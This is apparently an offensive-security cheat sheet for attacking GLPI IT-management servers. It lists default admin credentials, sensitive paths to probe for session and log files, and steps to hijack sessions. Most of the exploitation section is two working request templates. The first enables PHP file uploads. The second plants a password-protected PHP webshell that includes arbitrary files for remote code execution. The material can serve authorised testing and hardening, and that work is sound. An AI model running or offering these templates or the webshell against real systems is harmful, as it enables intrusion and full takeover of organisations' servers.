# GLPi IT Management

<div class="row row-cols-lg-2"><div>

GLPi is a popular open-source it management platform. It can be used for a variety of use cases going from host management to ticketing.

* [Official website](https://glpi-project.org/) <small>(4.2k ⭐)</small>
* [Github](https://github.com/glpi-project/glpi) <small>(4.2k ⭐)</small>
* MySQL/MariaDB and PHP

GLPi is commonly found in french enterprises even if they have another solutions globally, often for a specific use case.
</div><div>

Default credentials are:

* `glpi:glpi` (Super Admin)
* `post-only:post-only` (Self-Service)
* `tech:tech` (Technician)
* `normal:normal` (Observer)

⚠️ Using this software may be dangerous as each [release](https://github.com/glpi-project/glpi/releases) usually has many patched vulnerabilities <small>(3-7 per release, excluding misconfigurations)</small>.
</div></div>

<hr class="sep-both">

## GLPI — Website Discovery

<div class="row row-cols-lg-2"><div>

#### GLPI Discovery — Forced Browsing

By default, GLPI webserver should be mapped to the `/public/` folder. It's often misconfigured, leading to internal files being web-accessible.

* [ ] `/files/` - critical sensitive files, protected by .htaccess
  * [ ] `/files/_log/` - server and application logs
  * [ ] `/files/_sessions/` - PHP sessions
  * [ ] `/files/_tmp/` or `/files/_uploads/` - uploaded files 
* [ ] `/version/` - directory listing may be enabled
* [ ] `/vendor/` - protected by .htaccess
</div><div>

#### GLPI Discovery — Fingerprint

GLPi version can be found in two places.

* [x] Check for a file such as `/version/10.0.10`
* [x] Check for the version once connected in `About`
</div></div>

<hr class="sep-both">

## GLPI — Website Exploitation

<div class="row row-cols-lg-2"><div>

#### GLPI Exploitation — .htaccess failure

By default, `.htaccess` are ignored by Apache unless `AllowOverride` is specified. This can lead to multiple security issues.

* [ ] Navigate to `/files/_session/` and try every cookie
* [ ] Upload a PHP script and run it from `/files/_tmp/`

🛡️ Only expose the `/public/` folder or use `AllowOverride` on Apache.

#### GLPI Exploitation — PHP File Upload

🤖 Tested with GLPI `10.0.10` to `10.0.16`.

<details class="details-n">
<summary>Allow PHP Extension In File Upload</summary>

```yaml!
id: glpi-enable-php-upload

info:
  name: GLPI Enable PHP Upload
  author: anonymous
  severity: info

http:
  - method: GET
    path:
      - "{{BaseURL}}/front/profile.form.php"

    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - <meta property="glpi:csrf_token" content="

    extractors:
      - type: regex
        internal: true
        part: body
        name: token
        group: 1
        regex:
          - <meta\sproperty="glpi:csrf_token"\scontent="([[:alnum:]]{64})"

  - method: POST
    path:
      - "{{BaseURL}}/front/documenttype.form.php"

    headers:
      Content-Type: "multipart/form-data; boundary=----48d91b129fc5f9f6167b0f7da257b91"

    body: "------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"_glpi_csrf_token\"\r\n\r\n{{token}}\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nPHP\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\n\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"icon\"\r\n\r\nai-dist.png\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"is_uploadable\"\r\n\r\n1\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"ext\"\r\n\r\nphp\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"mime\"\r\n\r\n\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"add\"\r\n\r\n1\r\n------48d91b129fc5f9f6167b0f7da257b91\r\nContent-Disposition: form-data; name=\"_glpi_csrf_token\"\r\n\r\n{{token}}\r\n------48d91b129fc5f9f6167b0f7da257b91--\r\n"

    extractors:
      - type: status
        status:
          - 302
```
</details>

<details class="details-n">
<summary>Upload PHP File</summary>

```yaml!
id: glpi-upload-php-webshell

info:
  name: GLPI Upload setup.php webshell
  description: |
    Only one uploaded file can be named "setup.php" which can be used along with a specific LFI to get a RCE.
    This code upload some setup.php file that can be used to load another arbitrary.php.
    This makes it easy to exploit a website as we cannot delete nor modify "setup.php".

    With the intended LFI exploit, simply use: 

    {{BaseURL}}/front/plugin.php?passwd=Pwned1234!&target=your_real_webshell.php)
  author: anonymous
  severity: info

http:
  - method: GET
    path:
      - "{{BaseURL}}/front/profile.form.php"

    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - <meta property="glpi:csrf_token" content="

    extractors:
      - type: regex
        internal: true
        part: body
        name: token
        group: 1
        regex:
          - <meta\sproperty="glpi:csrf_token"\scontent="([[:alnum:]]{64})"

  - method: POST
    path:
      - "{{BaseURL}}/ajax/fileupload.php"

    headers:
      X-Glpi-Csrf-Token: "{{token}}"
      Content-Type: "multipart/form-data; boundary=----5caea02864785d478355a5e77c18d034"

    body: "------5caea02864785d478355a5e77c18d034\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n_uploader_filename\r\n------5caea02864785d478355a5e77c18d034\r\nContent-Disposition: form-data; name=\"showfilesize\"\r\n\r\n1\r\n------5caea02864785d478355a5e77c18d034\r\nContent-Disposition: form-data; name=\"_uploader_filename[]\"; filename=\"setup.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\r\nif(isset($_GET['passwd'])&&$_GET['passwd']===\"Pwned1234!\"){ini_set('display_errors',1);error_reporting(E_ALL);echo \"Password OK\";if(isset($_GET['target'])){include_once $_GET['target'];}die();}\r\n------5caea02864785d478355a5e77c18d034--\r\n"

    matchers:
      - type: status
        status:
          - 200
```
</details>
</div><div>
</div></div>